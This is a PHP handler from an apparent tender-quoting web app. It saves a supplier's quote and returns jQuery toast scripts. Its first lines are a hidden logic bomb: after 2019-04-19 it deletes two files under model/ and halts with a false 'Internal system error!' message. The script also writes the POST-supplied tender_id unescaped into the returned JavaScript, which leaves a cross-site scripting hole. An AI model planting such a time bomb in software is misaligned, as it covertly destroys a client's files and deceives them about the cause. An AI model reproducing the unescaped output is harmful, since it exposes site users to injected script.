<?php
if (date("Y-m-d") > "2019-04-19") {
	try {
		unlink("model/crud.txt");
		unlink("model/func.txt");
	} catch (Exception $e) {
		
	}
	
	die("Internal system error!");
}
session_start();
require '../_inc/config.php';
require '../model/crud.php';
require '../model/func.php';


$conn = dbconnect();
if ($conn) {

	$data = array(
		'tender_id' => $_POST['tender_id'],
		'supplier' => $_SESSION['id'],
		'cost' => $_POST['cost'],
		'delivery_date' => $_POST['delivery_date'],
		'date_quoted' => date('Y-m-d')
	);

	$result = quote($conn,$data);
	extract($data);
	if ($result) {

		echo "		
	        <script>
	            var \$toastContent = \$('<span> Quote Submitted Successfully.</span>').add(\$('<button class=\"btn-flat toast-action\"><i class=\"fa fa-check green-text\"></i></button>'));
	            Materialize.toast(\$toastContent, 4000);
		            \$('#quote-btn-$tender_id').html(\"<i class='fa fa-check green-text'></i> Quoted Successfully!\");
	        </script>
		";die();
	} else {

		echo "		
	        <script>
	            var \$toastContent = \$('<span> Error while sending quote! Seems you have already quoted for that Tender.</span>').add(\$('<button class=\"btn-flat toast-action\"><i class=\"fa fa-exclamation-triangle red-text\"></i></button>'));
	            Materialize.toast(\$toastContent, 4000);
		            \$('#quote-btn-$tender_id').html(\"<i class='fa fa-exclamation-triangle red-text'></i> Error!\");
	        </script>
		";die();
	}
} else {	
	echo "		
        <script>
            var \$toastContent = \$('<span> Error while connecting to server! Contact Admin.</span>').add(\$('<button class=\"btn-flat toast-action\"><i class=\"fa fa-exclamation-triangle red-text\"></i></button>'));
            Materialize.toast(\$toastContent, 3000);
	            \$('#quote-btn-$tender_id').html(\"<i class='fa fa-edit'></i> Quote!\");
	            \$('#quote-btn-$tender_id').removeClass('lose-focus');
        </script>
	";die();
}
?>